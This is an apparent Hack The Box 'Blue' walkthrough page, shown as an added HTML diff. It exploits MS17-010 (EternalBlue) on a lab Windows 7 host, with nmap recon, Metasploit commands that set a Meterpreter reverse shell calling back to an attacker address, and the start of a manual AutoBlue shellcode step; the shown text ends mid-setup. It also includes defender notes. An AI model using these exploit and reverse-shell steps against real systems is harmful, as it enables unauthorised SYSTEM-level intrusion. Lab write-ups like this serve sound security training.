@@ -1,0 +1,1219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Blue — EternalBlue MS17-010 Walkthrough by Ownuh</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Bebas+Neue&family=Inconsolata:wght@300;400;600;700&display=swap');
+
+:root {
+  --bg:        #04080f;
+  --deep:      #060d1a;
+  --surface:   #0a1628;
+  --card:      #0d1e35;
+  --border:    #132845;
+  --blue:      #1e90ff;
+  --blue-dim:  #0f5fbf;
+  --blue-xs:   #061428;
+  --cyan:      #00d4ff;
+  --ice:       #a8d4ff;
+  --amber:     #ffa040;
+  --red:       #ff4060;
+  --green:     #00ff9d;
+  --text:      #8ab4d4;
+  --muted:     #2a5070;
+  --white:     #d8ecff;
+  --glow: 0 0 20px rgba(30,144,255,0.3);
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: 'Inconsolata', monospace;
+  font-size: 14px;
+  line-height: 1.8;
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+/* ── noise texture overlay ── */
+body::before {
+  content: '';
+  position: fixed; inset: 0;
+  background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E");
+  background-size: 200px 200px;
+  pointer-events: none;
+  z-index: 9998;
+  opacity: 0.4;
+}
+
+/* ── animated grid ── */
+body::after {
+  content: '';
+  position: fixed; inset: 0;
+  background-image:
+    linear-gradient(rgba(30,144,255,0.05) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(30,144,255,0.05) 1px, transparent 1px);
+  background-size: 60px 60px;
+  animation: gridDrift 25s linear infinite;
+  pointer-events: none;
+  z-index: 0;
+}
+
+@keyframes gridDrift {
+  from { background-position: 0 0; }
+  to   { background-position: 60px 60px; }
+}
+
+/* ── hero banner ── */
+.hero-outer {
+  position: relative;
+  z-index: 1;
+  overflow: hidden;
+  border-bottom: 1px solid var(--border);
+  margin-bottom: 0;
+}
+
+.hero-outer::before {
+  content: 'MS17-010';
+  position: absolute;
+  right: -20px; top: -20px;
+  font-family: 'Bebas Neue', sans-serif;
+  font-size: clamp(100px, 22vw, 220px);
+  color: rgba(30,144,255,0.04);
+  letter-spacing: -4px;
+  pointer-events: none;
+  line-height: 1;
+  white-space: nowrap;
+}
+
+.hero-inner {
+  max-width: 940px;
+  margin: 0 auto;
+  padding: 56px 28px 48px;
+  position: relative;
+  z-index: 1;
+}
+
+.breadcrumb {
+  font-family: 'Space Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 3px;
+  text-transform: uppercase;
+  color: var(--muted);
+  margin-bottom: 24px;
+}
+
+.breadcrumb span { color: var(--blue); }
+
+h1 {
+  font-family: 'Bebas Neue', sans-serif;
+  font-size: clamp(52px, 10vw, 96px);
+  letter-spacing: 4px;
+  line-height: 0.95;
+  color: var(--white);
+  margin-bottom: 20px;
+}
+
+h1 .accent { color: var(--blue); }
+h1 .ghost  {
+  -webkit-text-stroke: 1px rgba(30,144,255,0.4);
+  color: transparent;
+}
+
+.hero-desc {
+  font-family: 'Inconsolata', monospace;
+  font-style: italic;
+  font-size: 14px;
+  color: var(--muted);
+  max-width: 620px;
+  border-left: 2px solid var(--blue-dim);
+  padding-left: 16px;
+  margin: 24px 0;
+  line-height: 1.7;
+}
+
+.hero-desc strong { color: var(--cyan); font-style: normal; }
+
+.meta-strip {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0;
+  margin-top: 32px;
+  border: 1px solid var(--border);
+}
+
+.meta-cell {
+  padding: 12px 20px;
+  border-right: 1px solid var(--border);
+  flex: 1;
+  min-width: 120px;
+}
+
+.meta-cell:last-child { border-right: none; }
+
+.meta-label {
+  font-family: 'Space Mono', monospace;
+  font-size: 9px;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  color: var(--muted);
+  margin-bottom: 4px;
+}
+
+.meta-val {
+  font-family: 'Space Mono', monospace;
+  font-size: 12px;
+  color: var(--cyan);
+}
+
+/* ── CVE callout bar ── */
+.cve-bar {
+  background: linear-gradient(135deg, var(--deep) 0%, #081530 100%);
+  border-top: 1px solid var(--border);
+  border-bottom: 1px solid var(--border);
+  padding: 16px 28px;
+  display: flex;
+  align-items: center;
+  gap: 20px;
+  flex-wrap: wrap;
+  position: relative;
+  z-index: 1;
+}
+
+.cve-badge {
+  font-family: 'Space Mono', monospace;
+  font-size: 11px;
+  padding: 6px 12px;
+  border: 1px solid var(--red);
+  color: var(--red);
+  letter-spacing: 2px;
+  background: rgba(255,64,96,0.05);
+}
+
+.cve-name {
+  font-family: 'Bebas Neue', sans-serif;
+  font-size: 20px;
+  color: var(--white);
+  letter-spacing: 2px;
+}
+
+.cve-detail {
+  font-size: 12px;
+  color: var(--muted);
+  flex: 1;
+  text-align: right;
+}
+
+/* ── main layout ── */
+main {
+  max-width: 940px;
+  margin: 0 auto;
+  padding: 56px 28px 120px;
+  position: relative;
+  z-index: 1;
+}
+
+/* ── attack chain timeline ── */
+.chain {
+  display: flex;
+  flex-direction: column;
+  gap: 0;
+  margin-bottom: 64px;
+  border: 1px solid var(--border);
+  overflow: hidden;
+}
+
+.chain-header {
+  background: var(--card);
+  padding: 12px 20px;
+  font-family: 'Space Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 3px;
+  color: var(--muted);
+  text-transform: uppercase;
+  border-bottom: 1px solid var(--border);
+}
+
+.chain-steps {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+}
+
+.chain-step {
+  padding: 16px 18px;
+  border-right: 1px solid var(--border);
+  position: relative;
+  overflow: hidden;
+  transition: background 0.2s;
+}
+
+.chain-step:last-child { border-right: none; }
+.chain-step:hover { background: var(--blue-xs); }
+
+.chain-step::after {
+  content: '→';
+  position: absolute;
+  right: -6px; top: 50%;
+  transform: translateY(-50%);
+  color: var(--blue-dim);
+  font-size: 12px;
+  z-index: 2;
+}
+
+.chain-step:last-child::after { display: none; }
+
+.step-n {
+  font-family: 'Space Mono', monospace;
+  font-size: 9px;
+  color: var(--blue);
+  opacity: 0.5;
+  margin-bottom: 6px;
+  letter-spacing: 1px;
+}
+
+.step-title {
+  font-family: 'Space Mono', monospace;
+  font-size: 11px;
+  color: var(--white);
+  margin-bottom: 4px;
+  font-weight: 700;
+}
+
+.step-sub { font-size: 11px; color: var(--muted); }
+
+/* ── sections ── */
+.section {
+  margin-bottom: 64px;
+  animation: rise 0.6s ease both;
+}
+
+@keyframes rise {
+  from { opacity: 0; transform: translateY(20px); }
+  to   { opacity: 1; transform: translateY(0); }
+}
+
+.sec-head {
+  display: grid;
+  grid-template-columns: auto 1fr auto;
+  align-items: center;
+  gap: 16px;
+  margin-bottom: 28px;
+}
+
+.sec-num {
+  font-family: 'Bebas Neue', sans-serif;
+  font-size: 36px;
+  color: var(--blue);
+  opacity: 0.4;
+  line-height: 1;
+}
+
+.sec-title {
+  font-family: 'Bebas Neue', sans-serif;
+  font-size: 22px;
+  letter-spacing: 3px;
+  color: var(--white);
+}
+
+.sec-rule { height: 1px; background: linear-gradient(90deg, var(--border), transparent); }
+
+/* ── prose ── */
+.prose {
+  font-size: 14px;
+  line-height: 1.9;
+  color: var(--text);
+  margin-bottom: 20px;
+}
+
+.prose strong { color: var(--cyan); font-weight: 600; }
+.prose em     { color: var(--amber); font-style: italic; }
+.prose code   {
+  font-family: 'Space Mono', monospace;
+  font-size: 12px;
+  background: var(--card);
+  border: 1px solid var(--border);
+  padding: 1px 6px;
+  color: var(--ice);
+}
+
+/* ── insight panel ── */
+.insight {
+  background: var(--blue-xs);
+  border: 1px solid var(--blue-dim);
+  border-left: 3px solid var(--blue);
+  padding: 18px 22px;
+  margin: 24px 0;
+  position: relative;
+  overflow: hidden;
+}
+
+.insight::before {
+  content: '';
+  position: absolute;
+  top: 0; right: 0;
+  width: 80px; height: 80px;
+  background: radial-gradient(circle, rgba(30,144,255,0.08), transparent 70%);
+  pointer-events: none;
+}
+
+.insight-label {
+  font-family: 'Space Mono', monospace;
+  font-size: 9px;
+  letter-spacing: 3px;
+  color: var(--blue);
+  text-transform: uppercase;
+  margin-bottom: 10px;
+}
+
+.insight p { font-size: 13px; color: var(--white); line-height: 1.8; }
+.insight strong { color: var(--cyan); }
+
+/* ── defender note ── */
+.defender {
+  background: rgba(0,212,255,0.04);
+  border: 1px solid rgba(0,212,255,0.2);
+  border-left: 3px solid var(--cyan);
+  padding: 16px 20px;
+  margin: 20px 0;
+}
+
+.defender-label {
+  font-family: 'Space Mono', monospace;
+  font-size: 9px;
+  letter-spacing: 3px;
+  color: var(--cyan);
+  text-transform: uppercase;
+  margin-bottom: 8px;
+}
+
+.defender p { font-size: 13px; color: var(--text); }
+
+/* ── terminal ── */
+.terminal {
+  background: #020509;
+  border: 1px solid var(--border);
+  margin: 24px 0;
+  overflow: hidden;
+  box-shadow: var(--glow);
+}
+
+.t-bar {
+  background: var(--card);
+  border-bottom: 1px solid var(--border);
+  padding: 8px 14px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  font-family: 'Space Mono', monospace;
+  font-size: 9px;
+  color: var(--muted);
+  letter-spacing: 2px;
+  text-transform: uppercase;
+}
+
+.t-bar-dots { display: flex; gap: 6px; }
+.dot { width: 8px; height: 8px; border-radius: 50%; }
+.dr { background: #ff3c5a; } .dy { background: #ffb300; } .dg { background: #00ff9d; }
+
+.t-body {
+  padding: 18px 22px;
+  font-family: 'Space Mono', monospace;
+  font-size: 12px;
+  line-height: 2;
+  overflow-x: auto;
+}
+
+.pr   { color: var(--cyan); }
+.cmd  { color: var(--white); }
+.out  { color: var(--muted); }
+.hi   { color: var(--amber); }
+.win  { color: var(--green); }
+.bad  { color: var(--red); }
+.inf  { color: var(--ice); }
+
+/* ── two-column approach cards ── */
+.approach-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 16px;
+  margin: 24px 0;
+}
+
+@media (max-width: 640px) {
+  .approach-grid { grid-template-columns: 1fr; }
+}
+
+.approach-card {
+  background: var(--card);
+  border: 1px solid var(--border);
+  padding: 20px;
+  position: relative;
+}
+
+.approach-card.active { border-color: var(--blue-dim); }
+
+.approach-badge {
+  font-family: 'Space Mono', monospace;
+  font-size: 9px;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  padding: 4px 8px;
+  border: 1px solid;
+  display: inline-block;
+  margin-bottom: 12px;
+}
+
+.badge-msf  { border-color: var(--amber); color: var(--amber); }
+.badge-man  { border-color: var(--blue);  color: var(--blue); }
+
+.approach-title {
+  font-family: 'Bebas Neue', sans-serif;
+  font-size: 18px;
+  letter-spacing: 2px;
+  color: var(--white);
+  margin-bottom: 8px;
+}
+
+.approach-body { font-size: 12px; color: var(--muted); line-height: 1.7; }
+
+/* ── tag row ── */
+.tags { display: flex; flex-wrap: wrap; gap: 8px; margin: 16px 0; }
+
+.tag {
+  font-family: 'Space Mono', monospace;
+  font-size: 10px;
+  padding: 4px 10px;
+  border: 1px solid;
+  letter-spacing: 1px;
+}
+
+.t-open  { border-color: var(--amber); color: var(--amber); }
+.t-vuln  { border-color: var(--red);   color: var(--red); }
+.t-win   { border-color: var(--green); color: var(--green); }
+.t-info  { border-color: var(--blue);  color: var(--blue); }
+
+/* ── data table ── */
+.data-table { width: 100%; border-collapse: collapse; margin: 16px 0; }
+
+.data-table th {
+  background: var(--card);
+  padding: 10px 14px;
+  border: 1px solid var(--border);
+  font-family: 'Space Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  color: var(--blue);
+  text-align: left;
+}
+
+.data-table td {
+  padding: 10px 14px;
+  border: 1px solid var(--border);
+  font-family: 'Space Mono', monospace;
+  font-size: 11px;
+}
+
+.data-table td:first-child { color: var(--muted); }
+.data-table td:last-child  { color: var(--white); }
+.data-table tr:hover td    { background: var(--blue-xs); }
+
+/* ── hash dump block ── */
+.hash-block {
+  background: #020509;
+  border: 1px solid var(--border);
+  padding: 18px 22px;
+  margin: 20px 0;
+  font-family: 'Space Mono', monospace;
+  font-size: 11px;
+  line-height: 2;
+  overflow-x: auto;
+}
+
+.hash-user { color: var(--ice); }
+.hash-hash { color: var(--red); }
+.hash-sep  { color: var(--muted); }
+
+/* ── post-exploit panel ── */
+.postex-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+  gap: 12px;
+  margin: 24px 0;
+}
+
+.postex-card {
+  background: var(--card);
+  border: 1px solid var(--border);
+  padding: 16px;
+  border-top: 2px solid var(--blue-dim);
+}
+
+.postex-icon { font-size: 18px; margin-bottom: 8px; }
+
+.postex-title {
+  font-family: 'Space Mono', monospace;
+  font-size: 11px;
+  color: var(--white);
+  font-weight: 700;
+  margin-bottom: 6px;
+}
+
+.postex-body { font-size: 11px; color: var(--muted); line-height: 1.6; }
+
+/* ── lesson callout ── */
+.lesson-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 2px;
+  margin: 24px 0;
+  border: 1px solid var(--border);
+  overflow: hidden;
+}
+
+@media (max-width: 560px) {
+  .lesson-grid { grid-template-columns: 1fr; }
+}
+
+.lesson-cell {
+  background: var(--card);
+  padding: 18px 20px;
+}
+
+.lesson-cell.full { grid-column: 1 / -1; }
+
+.lesson-label {
+  font-family: 'Space Mono', monospace;
+  font-size: 9px;
+  letter-spacing: 3px;
+  text-transform: uppercase;
+  margin-bottom: 8px;
+}
+
+.ll-red    { color: var(--red); }
+.ll-green  { color: var(--green); }
+.ll-blue   { color: var(--blue); }
+.ll-amber  { color: var(--amber); }
+
+.lesson-content { font-size: 12px; color: var(--text); line-height: 1.7; }
+.lesson-content strong { color: var(--white); }
+
+/* ── footer ── */
+.site-footer {
+  max-width: 940px;
+  margin: 0 auto;
+  padding: 32px 28px 60px;
+  border-top: 1px solid var(--border);
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: space-between;
+  align-items: flex-end;
+  gap: 20px;
+  position: relative;
+  z-index: 1;
+}
+
+.sig {
+  font-family: 'Bebas Neue', sans-serif;
+  font-size: 24px;
+  letter-spacing: 3px;
+  color: var(--blue);
+}
+
+.sig-sub {
+  font-family: 'Space Mono', monospace;
+  font-size: 11px;
+  font-style: italic;
+  color: var(--muted);
+  margin-top: 4px;
+}
+
+.footer-links {
+  text-align: right;
+  font-family: 'Space Mono', monospace;
+  font-size: 11px;
+  color: var(--muted);
+  line-height: 2;
+}
+
+/* ── cursor blink ── */
+.cur {
+  display: inline-block;
+  width: 7px; height: 13px;
+  background: var(--cyan);
+  vertical-align: middle;
+  margin-left: 2px;
+  animation: blink 1s step-end infinite;
+}
+
+@keyframes blink {
+  0%, 100% { opacity: 1; }
+  50%       { opacity: 0; }
+}
+</style>
+</head>
+<body>
+
+<!-- ══════ HERO ══════ -->
+<header class="hero-outer">
+  <div class="hero-inner">
+    <p class="breadcrumb">Hack The Box → Windows → <span>Blue</span></p>
+    <h1>
+      <span class="ghost">ETERNAL</span><br>
+      <span class="accent">BLUE</span>
+    </h1>
+    <div class="hero-desc">
+      This box teaches one of the most important lessons in offensive security:
+      <strong>the gap between "patched" and "deployed"</strong> is where attackers live.
+      MS17-010 was fixed in March 2017. Blue ran unpatched. That's not a vulnerability —
+      that's a policy failure. I exploit the box. Then I explain what a defender would do.
+    </div>
+    <div class="meta-strip">
+      <div class="meta-cell"><div class="meta-label">Platform</div><div class="meta-val">Hack The Box</div></div>
+      <div class="meta-cell"><div class="meta-label">OS</div><div class="meta-val">Windows 7 SP1</div></div>
+      <div class="meta-cell"><div class="meta-label">Difficulty</div><div class="meta-val">Easy</div></div>
+      <div class="meta-cell"><div class="meta-label">Objective</div><div class="meta-val">SYSTEM Shell</div></div>
+      <div class="meta-cell"><div class="meta-label">Author</div><div class="meta-val">Ownuh</div></div>
+    </div>
+  </div>
+</header>
+
+<!-- ══════ CVE BAR ══════ -->
+<div class="cve-bar">
+  <div class="cve-badge">CVE-2017-0143</div>
+  <div class="cve-name">MS17-010 / EternalBlue</div>
+  <div class="cve-detail">SMBv1 Remote Kernel Pool Corruption → SYSTEM · CVSS 9.3 · NSA Developed · WannaCry Vector</div>
+</div>
+
+<main>
+
+  <!-- attack chain -->
+  <div class="chain">
+    <div class="chain-header">Attack Chain</div>
+    <div class="chain-steps">
+      <div class="chain-step">
+        <div class="step-n">01</div>
+        <div class="step-title">Recon</div>
+        <div class="step-sub">Nmap full scan + SMB scripts</div>
+      </div>
+      <div class="chain-step">
+        <div class="step-n">02</div>
+        <div class="step-title">Confirm Vuln</div>
+        <div class="step-sub">smb-vuln-ms17-010 NSE + MSF scanner</div>
+      </div>
+      <div class="chain-step">
+        <div class="step-n">03A</div>
+        <div class="step-title">Exploit (MSF)</div>
+        <div class="step-sub">ms17_010_eternalblue → Meterpreter</div>
+      </div>
+      <div class="chain-step">
+        <div class="step-n">03B</div>
+        <div class="step-title">Exploit (Manual)</div>
+        <div class="step-sub">AutoBlue + msfvenom shellcode</div>
+      </div>
+      <div class="chain-step">
+        <div class="step-n">04</div>
+        <div class="step-title">Post-Exploit</div>
+        <div class="step-sub">Hashdump · Flags · Persistence</div>
+      </div>
+    </div>
+  </div>
+
+
+  <!-- ══════ SECTION 1: RECON ══════ -->
+  <section class="section">
+    <div class="sec-head">
+      <div class="sec-num">01</div>
+      <div class="sec-title">Reconnaissance</div>
+      <div class="sec-rule"></div>
+    </div>
+
+    <p class="prose">
+      Windows target. My first scan is always broad — I want everything, not just the 
+      top 1000 ports. Then I layer a targeted SMB scan on top because port 445 tells me 
+      far more than a generic <code>-sV</code> ever will. The key question I'm asking 
+      from the first scan: <strong>is SMBv1 running?</strong> Because if it is, on Windows 7, 
+      the next question almost answers itself.
+    </p>
+
+    <div class="terminal">
+      <div class="t-bar">
+        <div class="t-bar-dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div>
+        phase 1 — initial port scan
+      </div>
+      <div class="t-body">
+        <div><span class="pr">ownuh@kali:~$</span> <span class="cmd">nmap -sV -sC -T4 -p- 10.10.10.40 -oN blue_full.txt</span></div>
+        <div class="out">&nbsp;</div>
+        <div class="inf">PORT      STATE SERVICE       VERSION</div>
+        <div><span class="hi">135/tcp   open  msrpc</span>         <span class="out">Microsoft Windows RPC</span></div>
+        <div><span class="hi">139/tcp   open  netbios-ssn</span>   <span class="out">Microsoft Windows netbios-ssn</span></div>
+        <div><span class="hi">445/tcp   open  microsoft-ds</span>  <span class="win">Windows 7 Professional 7601 Service Pack 1</span></div>
+        <div><span class="out">49152/tcp open  msrpc</span></div>
+        <div><span class="out">49153/tcp open  msrpc</span></div>
+        <div><span class="out">49154/tcp open  msrpc</span></div>
+        <div class="out">&nbsp;</div>
+        <div class="inf">Host script results:</div>
+        <div class="out">| smb-security-mode:</div>
+        <div class="out">|   account_used: guest</div>
+        <div class="out">|   authentication_level: user</div>
+        <div class="out">|   challenge_response: supported</div>
+        <div class="win">|_  message_signing: disabled (DANGEROUS, but default)</div>
+        <div class="out">| smb2-security-mode:</div>
+        <div class="win">|   2.02: Message signing enabled but not required</div>
+      </div>
+    </div>
+
+    <div class="insight">
+      <div class="insight-label">⚡ Attacker Thinking</div>
+      <p>
+        <strong>Windows 7 SP1 + port 445 open + SMB signing disabled.</strong> 
+        That combination is a red flag stack. SMBv1 on Windows 7 is the exact 
+        environment MS17-010 targets. I don't assume — I confirm. 
+        But the direction is already clear. Now I run the vulnerability confirmation scan 
+        before touching Metasploit so I have evidence, not just instinct.
+      </p>
+    </div>
+
+    <div class="terminal">
+      <div class="t-bar">
+        <div class="t-bar-dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div>
+        phase 2 — targeted smb vuln check
+      </div>
+      <div class="t-body">
+        <div><span class="pr">ownuh@kali:~$</span> <span class="cmd">nmap -p 445 --script smb-vuln-ms17-010 10.10.10.40</span></div>
+        <div class="out">&nbsp;</div>
+        <div class="inf">Host script results:</div>
+        <div class="out">| smb-vuln-ms17-010:</div>
+        <div class="bad">|   VULNERABLE:</div>
+        <div class="bad">|   Remote Code Execution in Microsoft SMBv1 (MS17-010)</div>
+        <div class="bad">|     State: VULNERABLE</div>
+        <div class="bad">|     IDs: CVE:CVE-2017-0143</div>
+        <div class="out">|     Risk factor: HIGH</div>
+        <div class="out">|     Disclosure date: 2017-03-14</div>
+        <div class="win">|_  References: https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</div>
+      </div>
+    </div>
+
+    <div class="tags">
+      <span class="tag t-open">PORT 445 — SMBv1 ACTIVE</span>
+      <span class="tag t-vuln">CVE-2017-0143 CONFIRMED</span>
+      <span class="tag t-info">WINDOWS 7 SP1 x64</span>
+      <span class="tag t-info">SMB SIGNING DISABLED</span>
+    </div>
+
+    <p class="prose">
+      Two independent checks both confirm vulnerability. I cross-verified with Nmap NSE and 
+      will use Metasploit's auxiliary scanner as a third confirmation before firing the exploit.
+      In real engagements, false positives waste time and false negatives mean missed critical findings.
+      Always verify twice.
+    </p>
+  </section>
+
+
+  <!-- ══════ SECTION 2: UNDERSTANDING THE VULN ══════ -->
+  <section class="section">
+    <div class="sec-head">
+      <div class="sec-num">02</div>
+      <div class="sec-title">Understanding EternalBlue</div>
+      <div class="sec-rule"></div>
+    </div>
+
+    <p class="prose">
+      Most walkthroughs skip this. I won't. Understanding <em>why</em> EternalBlue works 
+      is what separates a practitioner from someone who just runs Metasploit.
+    </p>
+
+    <p class="prose">
+      <strong>The vulnerability:</strong> MS17-010 exploits a buffer overflow in the 
+      Windows SMBv1 server. When Windows processes certain malformed <em>Transaction</em> 
+      requests over SMB, an integer overflow allows an attacker to write beyond the bounds 
+      of a kernel pool buffer. Because the Windows kernel heap uses predictable pool 
+      allocations, a carefully crafted payload can overwrite function pointers in adjacent 
+      memory — leading to <strong>arbitrary kernel-mode code execution</strong> without 
+      any authentication.
+    </p>
+
+    <p class="prose">
+      This was originally developed by the NSA as part of their offensive toolkit, code-named 
+      <em>EternalBlue</em>. It was leaked by the Shadow Brokers in April 2017. Within weeks, 
+      it was weaponised into <strong>WannaCry</strong> — which hit 230,000 machines across 
+      150 countries in 24 hours. Microsoft had patched it in March 2017. Blue is running 
+      without that patch.
+    </p>
+
+    <table class="data-table">
+      <tr><th>Property</th><th>Value</th></tr>
+      <tr><td>CVE</td><td>CVE-2017-0143, CVE-2017-0144, CVE-2017-0145</td></tr>
+      <tr><td>Patch Bulletin</td><td>MS17-010 (March 14, 2017)</td></tr>
+      <tr><td>Attack Vector</td><td>Network — no authentication required</td></tr>
+      <tr><td>Access Gained</td><td>NT AUTHORITY\SYSTEM (kernel-level)</td></tr>
+      <tr><td>Affected Protocol</td><td>SMBv1 (TCP 445)</td></tr>
+      <tr><td>Real-World Damage</td><td>WannaCry, NotPetya, ~$10B+ global losses</td></tr>
+    </table>
+
+    <div class="defender">
+      <div class="defender-label">🛡 Blue Team Context</div>
+      <p>
+        This exploit bypasses all authentication. A firewall rule blocking inbound TCP/445 
+        from external networks prevents remote exploitation — but EternalBlue is often 
+        used <em>laterally</em> inside networks, where firewalls don't help. 
+        The real fix is patching, disabling SMBv1, and network segmentation.
+      </p>
+    </div>
+  </section>
+
+
+  <!-- ══════ SECTION 3: EXPLOITATION ══════ -->
+  <section class="section">
+    <div class="sec-head">
+      <div class="sec-num">03</div>
+      <div class="sec-title">Exploitation — Two Paths</div>
+      <div class="sec-rule"></div>
+    </div>
+
+    <p class="prose">
+      I'm documenting both approaches here because understanding <em>only</em> Metasploit 
+      means you're dependent on a framework you don't fully understand. 
+      The manual path teaches you what the exploit is actually doing.
+    </p>
+
+    <div class="approach-grid">
+      <div class="approach-card active">
+        <div class="approach-badge badge-msf">Approach A</div>
+        <div class="approach-title">Metasploit Module</div>
+        <div class="approach-body">Fast, reliable, well-maintained. Best for time-boxed engagements. Drops a full Meterpreter session. Automates architecture detection and payload staging.</div>
+      </div>
+      <div class="approach-card">
+        <div class="approach-badge badge-man">Approach B</div>
+        <div class="approach-title">Manual — AutoBlue Script</div>
+        <div class="approach-body">Community Python exploit using msfvenom shellcode. Requires understanding payload staging, listener setup, and architecture matching. Deeper learning value.</div>
+      </div>
+    </div>
+
+    <!-- APPROACH A -->
+    <p class="prose" style="margin-top:32px;">
+      <strong>Approach A — Metasploit</strong>
+    </p>
+
+    <p class="prose">
+      Before firing the exploit, I run the auxiliary scanner as a third confirmation. 
+      Two Nmap scripts + Metasploit scanner agreeing means I proceed with high confidence.
+    </p>
+
+    <div class="terminal">
+      <div class="t-bar">
+        <div class="t-bar-dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div>
+        metasploit — auxiliary scanner confirmation
+      </div>
+      <div class="t-body">
+        <div><span class="pr">msf6&gt;</span> <span class="cmd">use auxiliary/scanner/smb/smb_ms17_010</span></div>
+        <div><span class="pr">msf6 auxiliary&gt;</span> <span class="cmd">set RHOSTS 10.10.10.40</span></div>
+        <div><span class="pr">msf6 auxiliary&gt;</span> <span class="cmd">run</span></div>
+        <div class="out">&nbsp;</div>
+        <div class="win">[+] 10.10.10.40:445 - Host is LIKELY VULNERABLE to MS17-010!</div>
+        <div class="out">[*]  - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</div>
+        <div class="out">[*] Scanned 1 of 1 hosts (100% complete)</div>
+      </div>
+    </div>
+
+    <div class="terminal">
+      <div class="t-bar">
+        <div class="t-bar-dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div>
+        metasploit — ms17_010_eternalblue exploit
+      </div>
+      <div class="t-body">
+        <div><span class="pr">msf6&gt;</span> <span class="cmd">use exploit/windows/smb/ms17_010_eternalblue</span></div>
+        <div><span class="pr">msf6 exploit&gt;</span> <span class="cmd">set RHOSTS 10.10.10.40</span></div>
+        <div><span class="pr">msf6 exploit&gt;</span> <span class="cmd">set LHOST 10.10.14.5</span></div>
+        <div><span class="pr">msf6 exploit&gt;</span> <span class="cmd">set payload windows/x64/meterpreter/reverse_tcp</span></div>
+        <div><span class="pr">msf6 exploit&gt;</span> <span class="cmd">set VERIFY_ARCH true</span></div>
+        <div><span class="pr">msf6 exploit&gt;</span> <span class="cmd">run</span></div>
+        <div class="out">&nbsp;</div>
+        <div class="out">[*] Started reverse TCP handler on 10.10.14.5:4444</div>
+        <div class="out">[*] 10.10.10.40:445 - Connecting to target for exploitation.</div>
+        <div class="out">[+] 10.10.10.40:445 - Connection established for exploitation.</div>
+        <div class="out">[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 SP1</div>
+        <div class="out">[*] 10.10.10.40:445 - CORE raw buffer driver successfully mapped.</div>
+        <div class="out">[*] 10.10.10.40:445 - Overflow buffer ready. Triggering exploit...</div>
+        <div class="win">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</div>
+        <div class="win">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</div>
+        <div class="win">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</div>
+        <div class="out">&nbsp;</div>
+        <div class="win">[*] Meterpreter session 1 opened (10.10.14.5:4444 → 10.10.10.40:49158)</div>
+        <div class="out">&nbsp;</div>
+        <div><span class="pr">meterpreter&gt;</span> <span class="cmd">getuid</span></div>
+        <div class="win">Server username: NT AUTHORITY\SYSTEM</div>
+      </div>
+    </div>
+
+    <div class="insight">
+      <div class="insight-label">⚡ Attacker Thinking</div>
+      <p>
+        <strong>NT AUTHORITY\SYSTEM — no privilege escalation needed.</strong> 
+        EternalBlue gives you the highest privilege level on a Windows machine 
+        directly, because the exploit runs in kernel space. There's no 
+        "user → admin → SYSTEM" ladder to climb here. You come in at the top. 
+        This is exactly why this vulnerability was classified as CVSS 9.3 — 
+        network access, no auth, full system compromise.
+      </p>
+    </div>
+
+    <!-- APPROACH B -->
+    <p class="prose" style="margin-top:40px;">
+      <strong>Approach B — Manual Exploit (AutoBlue)</strong>
+    </p>
+
+    <p class="prose">
+      This approach uses the community AutoBlue script to fire the exploit with 
+      a custom-generated shellcode payload. It's worth understanding because it 
+      shows you what Metasploit is doing under the hood, and gives you a fallback 
+      when Metasploit fails or isn't permitted in an engagement.
+    </p>
+
+    <div class="terminal">
+      <div class="t-bar">
+        <div class="t-bar-dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div>
+        manual path — setup + shellcode generation
+      </div>
+      <div class="t-body">
+        <div class="out"># Step 1: clone AutoBlue</div>
+        <div><span class="pr">ownuh@kali:~$</span> <span class="cmd">git clone https://github.com/3ndG4me/AutoBlue-MS17-010</span></div>
+        <div><span class="pr">ownuh@kali:~$</span> <span class="cmd">cd AutoBlue-MS17-010 && pip install -r requirements.txt</span></div>
+        <div class="out">&nbsp;</div>
+        <div class="out"># Step 2: generate shellcode (x64 reverse shell via msfvenom)</div>
+        <div><span class="pr">ownuh@kali:~$</span> <span class="cmd">./shellcode/shell_prep.sh</span></div>
+        <div class="inf">Enter LHOST: 10.10.14.5</div>
+        <div class="inf">Enter LPORT: 4444</div>
